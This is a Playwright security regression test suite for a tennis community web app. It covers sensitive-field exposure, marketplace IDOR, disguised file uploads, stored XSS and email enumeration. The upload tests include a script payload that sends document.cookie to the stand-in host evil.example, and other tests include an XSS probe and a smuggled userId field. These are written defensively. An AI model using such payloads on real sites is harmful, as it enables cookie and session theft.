import { test, expect } from '@playwright/test';
import { registerPlayer, registerCoach } from '../helpers/auth';
import { completePlayerProfile, completeCoachProfile } from '../helpers/profile';

/*
  Security regression suite - not "does the feature work", but "does
  the thing we already found and fixed stay fixed". Two vulnerability
  classes, each with its own describe block:

  1. Sensitive-field exposure (SEC-001/002): a public profile response
     must never include password/email/isAdmin/isApproved/isTestUser/
     isHidden/status/emailVerified/emailVerifiedAt - see
     server/lib/sanitizeUser.ts's toPublicUser().

  2. IDOR on the marketplace (SEC-003..006): every mutating marketplace
     endpoint must verify the caller owns the item, not just that
     they're logged in - see the and(eq(id), eq(userId)) pattern in
     server/storage.ts's marketplace methods.

  Both SEC-001 and SEC-003 are @smoke - these are exactly the two
  classes of bug this session shipped fixes for, so a regression here
  is the highest-value thing this suite can catch on every deploy.
*/

// Fields that must NEVER appear in a response about someone ELSE's
// account - see server/lib/sanitizeUser.ts toPublicUser().
const FORBIDDEN_PUBLIC_USER_FIELDS = [
  'password',
  'email',
  'isAdmin',
  'isApproved',
  'isTestUser',
  'isHidden',
  'status',
  'emailVerified',
  'emailVerifiedAt',
];

function assertNoForbiddenFields(user: Record<string, unknown>, context: string) {
  const leaked = FORBIDDEN_PUBLIC_USER_FIELDS.filter((field) => field in user);
  expect(leaked, `${context} leaked forbidden field(s): ${leaked.join(', ')}`).toEqual([]);
}

test.describe('Security: public profile data exposure', () => {
  test('@smoke SEC-001 Public player profile never exposes password hash or internal fields', async ({ page }) => {
    const player = await registerPlayer(page);
    await completePlayerProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/players/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/players/:slug');

    // Positive check too - a response that leaked nothing because it
    // ALSO stopped returning real data would silently pass the check
    // above for the wrong reason.
    expect(data.user.name).toBeTruthy();
    expect(data.user.slug).toBe(me.slug);
  });

  test('@smoke SEC-002 Public coach profile never exposes password hash or internal fields', async ({ page }) => {
    await registerCoach(page);
    await completeCoachProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/coaches/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/coaches/:slug');
    expect(data.user.name).toBeTruthy();
    expect(data.user.slug).toBe(me.slug);
  });

  test('SEC-002b Incomplete player profile still never exposes internal fields', async ({ page }) => {
    // Registered but deliberately never completed the profile wizard -
    // the exact case that motivated relaxing the 404 in the first
    // place (see server/routes/players.ts). Still must never leak.
    await registerPlayer(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const res = await page.request.get(`/api/players/${me.slug}`);
    expect(res.ok()).toBeTruthy();
    const data = await res.json();

    assertNoForbiddenFields(data.user, 'GET /api/players/:slug (incomplete profile)');
    expect(data.user.name).toBeTruthy();
  });
});

test.describe('Security: marketplace IDOR', () => {
  async function createMarketplaceItem(page: import('@playwright/test').Page, title: string) {
    const res = await page.request.post('/api/profile/marketplace', {
      data: {
        title,
        price: '50',
        condition: 'Used',
        location: 'Sydney, NSW',
      },
    });
    expect(res.ok()).toBeTruthy();
    return res.json();
  }

  test('@smoke SEC-003 A marketplace item cannot be deleted by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only racquet ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const deleteRes = await otherPage.request.delete(`/api/profile/marketplace/${item.id}`);
      expect(deleteRes.status()).toBe(404);

      // The item must still exist for its real owner afterwards - a
      // 404 that quietly still deleted the row would be just as bad.
      const stillThereRes = await page.request.get('/api/profile/marketplace');
      const myItems = await stillThereRes.json();
      expect(myItems.some((i: any) => i.id === item.id)).toBe(true);
    } finally {
      await otherContext.close();
    }
  });

  test('SEC-004 A marketplace item cannot be edited by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only string set ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const putRes = await otherPage.request.put(`/api/profile/marketplace/${item.id}`, {
        data: { title: 'Hijacked title', price: '1' },
      });
      expect(putRes.status()).toBe(404);

      const myItemsRes = await page.request.get('/api/profile/marketplace');
      const myItems = await myItemsRes.json();
      const stillMine = myItems.find((i: any) => i.id === item.id);
      expect(stillMine?.title).toBe(item.title);
    } finally {
      await otherContext.close();
    }
  });

  test("SEC-004b A listing's ownership cannot be reassigned via the update payload, even by its real owner", async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Non-transferable listing ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    let otherUserId: string;
    try {
      await registerPlayer(otherPage);
      const otherMeRes = await otherPage.request.get('/api/auth/me');
      otherUserId = (await otherMeRes.json()).id;
    } finally {
      await otherContext.close();
    }

    // The real owner tries to smuggle a new userId into an otherwise
    // legitimate update - the allowlist in updateMarketplaceItem must
    // silently ignore it, not honour it.
    const putRes = await page.request.put(`/api/profile/marketplace/${item.id}`, {
      data: { title: 'Still mine', userId: otherUserId },
    });
    expect(putRes.ok()).toBeTruthy();

    const myItemsRes = await page.request.get('/api/profile/marketplace');
    const myItems = await myItemsRes.json();
    expect(myItems.some((i: any) => i.id === item.id)).toBe(true);
  });

  test('SEC-005 Photos cannot be added to or removed from a marketplace item by a non-owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const item = await createMarketplaceItem(page, `Owner-only photos item ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const removeRes = await otherPage.request.delete(`/api/profile/marketplace/${item.id}/photos`, {
        data: { photoUrl: 'https://example.com/whatever.webp' },
      });
      expect(removeRes.status()).toBe(404);
    } finally {
      await otherContext.close();
    }
  });
});

test.describe('Security: malicious file upload rejection', () => {
  // A real image file starts with a specific magic-number byte
  // sequence (see server/lib/imageValidation.ts detectImageType) - a
  // plain text/HTML payload never matches any of them, regardless of
  // what filename or Content-Type the client claims for it. Every one
  // of these attempts declares itself as a legitimate image on the
  // wire (name "evil.webp", mimeType "image/webp") while the actual
  // bytes are an HTML/script payload - exactly what an attacker
  // uploading a disguised file would send.
  const disguisedHtmlPayload = Buffer.from('<script>document.location="https://evil.example/steal?c="+document.cookie</script>');

  test('@smoke SEC-007 Marketplace photo upload rejects a disguised non-image file', async ({ page }) => {
    await registerPlayer(page);
    const itemRes = await page.request.post('/api/profile/marketplace', {
      data: { title: `Upload test item ${Date.now()}`, price: '10', condition: 'Used', location: 'Sydney, NSW' },
    });
    const item = await itemRes.json();

    const uploadRes = await page.request.post(`/api/profile/marketplace/${item.id}/photos`, {
      multipart: {
        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
      },
    });
    expect(uploadRes.status()).toBe(400);
  });

  test('SEC-008 Tournament history photo upload rejects a disguised non-image file', async ({ page }) => {
    await registerPlayer(page);
    const entryRes = await page.request.post('/api/profile/tournament-history', {
      data: { name: `Upload test tournament ${Date.now()}`, location: 'Sydney, NSW', date: '2026-01-01' },
    });
    const entry = await entryRes.json();

    const uploadRes = await page.request.post(`/api/profile/tournament-history/${entry.id}/photos`, {
      multipart: {
        file: { name: 'evil.webp', mimeType: 'image/webp', buffer: disguisedHtmlPayload },
      },
    });
    // This route's error path currently surfaces any thrown Error as a
    // generic 500 rather than a mapped 400 (see the route's plain
    // catch(e) { next(e) }) - the one thing that actually matters for
    // this test is that it's rejected, not stored as a "photo".
    expect(uploadRes.ok()).toBeFalsy();

    const stillThereRes = await page.request.get(`/api/profile/tournament-history?userId=${entry.userId}`);
    const entries = await stillThereRes.json();
    const stored = entries.find((e: any) => e.id === entry.id);
    expect(stored?.photos ?? []).toHaveLength(0);
  });
});

test.describe('Security: stored XSS is neutralised on render', () => {
  // React escapes text children by default (it renders a <script> tag
  // in a bio as inert TEXT, never as markup that gets parsed) - this
  // is what actually protects the app, not any server-side stripping
  // of the input. These tests check the rendered PAGE for a stored
  // payload, not just that the API accepted/returned it, since storing
  // the raw string is expected and correct; only the render matters.
  const xssPayload = `<script>window.__xssFired = true;</script>`;

  test('@smoke SEC-010 A script tag saved in a player bio never executes when the profile is viewed', async ({ page }) => {
    await registerPlayer(page);
    await completePlayerProfile(page);

    const meRes = await page.request.get('/api/auth/me');
    const me = await meRes.json();

    const updateRes = await page.request.put('/api/me/player-profile', {
      data: { bio: xssPayload },
    });
    expect(updateRes.ok()).toBeTruthy();

    await page.goto(`/player/${me.slug}`);

    // If the payload had actually executed as script, this flag would
    // be set on the page's own window object.
    const fired = await page.evaluate(() => (window as any).__xssFired);
    expect(fired).toBeUndefined();

    // And it should still be visible as plain, inert text somewhere on
    // the page - proving it was rendered, not silently dropped (a bio
    // that just vanished would also make the __xssFired check above
    // pass for the wrong reason).
    await expect(page.getByText('window.__xssFired', { exact: false })).toBeVisible();
  });
});

test.describe('Security: registration does not leak whether an email is already taken', () => {
  test('@smoke SEC-009 Registering with an already-used email gets the exact same response as a real new signup', async ({ page }) => {
    const email = `sec009_${Date.now()}@tennisconnect.test`;
    const payload = { email, password: 'Test123456!', name: 'Sec Test', role: 'player' };

    const firstRes = await page.request.post('/api/auth/register', { data: payload });
    expect(firstRes.status()).toBe(201);
    const firstBody = await firstRes.json();

    // Second attempt, same email - must be indistinguishable from the
    // first: same status, same message, same requiresVerification
    // flag. No "Email already exists", nothing that lets the caller
    // tell these two responses apart.
    const secondRes = await page.request.post('/api/auth/register', {
      data: { ...payload, name: 'Someone Else' },
    });
    expect(secondRes.status()).toBe(firstRes.status());
    const secondBody = await secondRes.json();
    expect(secondBody).toEqual(firstBody);
    expect(JSON.stringify(secondBody).toLowerCase()).not.toContain('already');
  });
});

test.describe('Security: tournament history ownership (regression - already correct, locking it in)', () => {
  async function createTournamentEntry(page: import('@playwright/test').Page, name: string) {
    const res = await page.request.post('/api/profile/tournament-history', {
      data: { name, location: 'Sydney, NSW', date: '2026-01-01', result: 'Winner' },
    });
    expect(res.ok()).toBeTruthy();
    return res.json();
  }

  test('SEC-006 A tournament history entry cannot be edited or deleted by anyone other than its owner', async ({ page, browser }) => {
    await registerPlayer(page);
    const entry = await createTournamentEntry(page, `Owner-only tournament ${Date.now()}`);

    const otherContext = await browser.newContext();
    const otherPage = await otherContext.newPage();
    try {
      await registerPlayer(otherPage);

      const putRes = await otherPage.request.put(`/api/profile/tournament-history/${entry.id}`, {
        data: { name: 'Hijacked' },
      });
      // This route doesn't have its own 404 mapping the way the
      // marketplace ones were just given - the ownership check still
      // throws and blocks the write, it just surfaces as a generic
      // 500 today. The one thing this test cares about either way:
      // never a success, and the entry is never actually changed.
      expect(putRes.ok()).toBeFalsy();

      const deleteRes = await otherPage.request.delete(`/api/profile/tournament-history/${entry.id}`);
      expect(deleteRes.ok()).toBeFalsy();
    } finally {
      await otherContext.close();
    }
  });
});
